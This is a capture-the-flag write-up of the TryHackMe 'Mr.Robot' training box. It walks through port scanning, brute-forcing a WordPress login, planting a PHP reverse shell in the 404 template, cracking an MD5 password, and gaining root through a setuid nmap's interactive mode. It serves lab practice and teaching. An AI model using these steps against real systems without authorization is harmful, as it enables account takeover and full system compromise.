---
layout: post
title: tryhackme Mr.Robot write up
---

![mr.robot](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/cfa67a59a1a729fbcb5c3e6caa5554c41fcd6c1e/assets/thm/robot/mr_robot.jpg)

### about the machine

this is a medium rated box from [tryhackme](https://tryhackme.com), thought a little too easy if you asked me

### Reconnaissance

I added the box ip to my hosts file then a ran a quick nmap scan
```bash
# Nmap 7.91 scan initiated Wed Jan  6 22:39:07 2021 as: nmap -v -oN ports ctf.thm
Nmap scan report for ctf.thm (10.10.15.148)
Host is up (0.37s latency).
Not shown: 997 filtered ports
PORT    STATE  SERVICE
22/tcp  closed ssh
80/tcp  open   http
443/tcp open   https

Read data files from: /usr/bin/../share/nmap
# Nmap done at Wed Jan  6 22:39:26 2021 -- 1 IP address (1 host up) scanned in 19.88 seconds

```

### http enumeration

I visited both the `http` and the `https` and they seemed to have the same page, which is an interactive command line with couple defined commands, non of them were useful though
![command line](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/cfa67a59a1a729fbcb5c3e6caa5554c41fcd6c1e/assets/thm/robot/command_line.png)

visiting `robots.txt` I got the following result
```bash
User-agent: *
fsocity.dic
key-1-of-3.txt
```

looks like we found the first flag and what appreared to be very big a wordlist full of duplicated words

```bash
$ wget ctf.thm/fsocity.dic
--2021-01-06 22:56:37--  http://ctf.thm/fsocity.dic
Resolving ctf.thm (ctf.thm)... 10.10.28.187
Connecting to ctf.thm (ctf.thm)|10.10.28.187|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 7245381 (6.9M) [text/x-c]
Saving to: ‘fsocity.dic’
858160 fsocity.dic

fsocity.dic         100%[================>]   6.91M   436KB/s    in 17s     

2021-01-06 22:57:01 (405 KB/s) - ‘fsocity.dic’ saved [7245381/7245381]
$ wc -l fsocity.dic
858160 fsocity.dic
$ cat fsocity.dic | sort -u > small.dict
$ wc -l small.dict
11451 small.dict
```

then I've ran some http files brutforce. turned out is website is running wordpress

```bash
$ ngobuster dir -u ctf.thm -w $RAFT -t 30 -o robot.raft
/license.txt (Status: 200)
/index.php (Status: 301)
/wp-login.php (Status: 200)
/wp-register.php (Status: 301)
/index.html (Status: 200)
```

I tried getting enumerating the users by visiting `ctf.thm/?author=id` but it didn't work, then I browsed to `wp-login.php` and since I this is a mr.robot themed box I tried the user name `elliot` and bingo, the user existed (if anyone knows another method for getting a user without guessing please let me know)

![found user elleiot](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/cfa67a59a1a729fbcb5c3e6caa5554c41fcd6c1e/assets/thm/robot/found_user.png)

I've tried bruteforcing the password using the wordlist I got earlier and I've got some creds

```bash
$ echo elliot > user.txt
$ wpscan --url ctf.thm -U user.txt -P small.dict
...
[!] Performing password attack on Xmlrpc Multicall against 1 user/s
[!] Valid Combinations Found:
 | Username: elliot, Password: REDACTED_PASSWORD
```
# aaand I'm in
![logged in](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/cfa67a59a1a729fbcb5c3e6caa5554c41fcd6c1e/assets/thm/robot/wp_loged_in.png)


from here, first thing I've done is browsing to `appearance -> editor` and I've edited the `404.php` template to include a php reverse shell I got from [here](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)

![malicious 404.php](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/cfa67a59a1a729fbcb5c3e6caa5554c41fcd6c1e/assets/thm/robot/malicious_404.png)


then I browsed to `ctf.thm/jeff`, got a reverse connection, stabilized it then I began searching for the second flag

```bash
daemon@linux:~$ whoami
daemon
daemon@linux:~$ ls /home/
robot
daemon@linux:~$ cd /home/robot/
daemon@linux:/home/robot$ ls -lh
total 8.0K
-r-------- 1 robot robot 33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot 39 Nov 13  2015 password.raw-md5
daemon@linux:/home/robot$ cat key-2-of-3.txt
cat: key-2-of-3.txt: Permission denied
daemon@linux:/home/robot$
```

I found an md5-hashed `robot`'s creds, I got the original password by just copy/pasting the hash into google then I got the flag

### gaining root prileveges

the box had a really old version of `nmap` with a setuid bit set, old versions of nmap support the `--interactive` options, which lets you execute shell commands from an `nmap` prompts

```bash
daemon@linux:/home/robot$ find / -perm -u=s 2>/dev/null 
...
/usr/local/bin/nmap
...
^C
daemon@linux:/home/robot$ /usr/local/bin/nmap --version

nmap version 3.81 ( http://www.insecure.org/nmap/ )
daemon@linux:/home/robot$ /usr/local/bin/nmap --interactive

Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !bash -p
bash-4.3# whoami
root
bash-4.3# cd /root
bash-4.3# ls -lh
total 4.0K
-rw-r--r-- 1 root root  0 Nov 13  2015 firstboot_done
-r-------- 1 root root 33 Nov 13  2015 key-3-of-3.txt
bash-4.3# touch key-3-of-3.txt
bash-4.3# 
```
